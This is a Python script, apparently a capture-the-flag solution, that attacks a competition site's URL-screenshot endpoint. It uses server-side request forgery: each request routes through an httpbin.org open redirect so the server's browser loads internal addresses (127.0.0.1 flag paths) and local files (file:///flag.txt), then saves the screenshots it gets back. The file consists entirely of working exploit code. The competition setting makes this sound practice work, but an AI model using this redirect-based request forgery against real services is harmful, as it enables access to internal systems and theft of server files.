import requests
import time
import base64
import hashlib
import re

URL = "https://poiuytrewqazx-csc26.cybersecuritychallenge.al/analizo"
REDIRECT_BASE = "https://httpbin.org/redirect-to?url="

PATHS = [
    # Most likely flag locations
    "http://127.0.0.1/flag",
    "http://127.0.0.1/flag.txt",
    "http://127.0.0.1/key",
    "http://127.0.0.1/secret",
    "file:///flag.txt",
    "file:///flag"
]

def check_server():
    try:
        r = requests.get("https://poiuytrewqazx-csc26.cybersecuritychallenge.al/", timeout=5)
        return r.status_code == 200
    except:
        return False

def save_image(b64, label):
    try:
        raw = base64.b64decode(b64)
        h = hashlib.md5(raw).hexdigest()
        fn = f"flag_candidate_{label}_{h[:6]}.png"
        with open(fn, "wb") as f:
            f.write(raw)
        print(f"[+] Saved {fn}")
    except:
        pass

def attack(path):
    # Construct redirect URL
    target = REDIRECT_BASE + path
    # If path is file://, httpbin won't redirect to it correctly usually? 
    # Httpbin takes 'url' param. If I pass 'file:///...', httpbin redirects to 'file:///...'. 
    # The Browser receives Location: file:///... 
    # Chrome blocks this.
    # But let's try anyway.
    
    print(f"[*] Testing {path}...")
    try:
        r = requests.post(URL, data={"url": target, "submit": "Analizo"}, timeout=30)
        
        match = re.search(r'src="data:image/png;base64,([^"]+)"', r.text)
        if match:
            # Short label
            clean_label = re.sub(r'[^a-zA-Z0-9]', '', path)[-10:]
            save_image(match.group(1), clean_label)
        else:
            print(f"[-] No image for {path}")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    print("Waiting for server recovery...")
    while not check_server():
        print(".", end="", flush=True)
        time.sleep(2)
    print("\n[+] Server is UP! Starting Gentle Scan...")
    
    for p in PATHS:
        attack(p)
        time.sleep(2) # Be gentle

if __name__ == "__main__":
    main()
